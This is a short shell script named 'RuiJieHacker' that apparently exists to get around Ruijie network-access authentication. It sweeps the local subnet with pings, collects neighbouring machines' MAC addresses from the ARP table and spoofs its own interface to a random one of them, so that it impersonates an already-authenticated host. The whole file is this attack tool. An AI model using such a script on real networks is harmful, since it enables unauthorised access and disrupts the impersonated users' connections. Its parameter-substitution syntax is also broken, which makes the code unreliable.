#! /usr/bin/sh
##############################################################
# Project Name : RuiJieHacker                                         
# Author: luoweifeng1989                                              
# Date: 2011-4-23                                                     
# All Rights Reserved.                                                
# Usage: bash ./HackerV3.0.sh 172.29.132.1
##############################################################

declare -a macs

##############################################################
ipdomain=${$1:0:((`expr length $1`-1))}
##############################################################
for (( i = 2; i < 255 ; i ++ ))
do
    sudo ping -c 1 -qf -w 0.01 ${ipdomain}$i > /dev/null 2>&1
done
##############################################################
macstmp=`arp -a | awk '/ether/{ print $4}' -`
##############################################################
sudo /sbin/ifconfig eth0 down
##############################################################
for mac in $macstmp 
do
	macs[$j]=$mac
	(( j++ ))
done
##############################################################
(( random=$RANDOM % ${#macs[@]} ))
sudo /sbin/ifconfig eth0 hw ether ${macs[$random]}
##############################################################
sudo /sbin/ifconfig eth0 up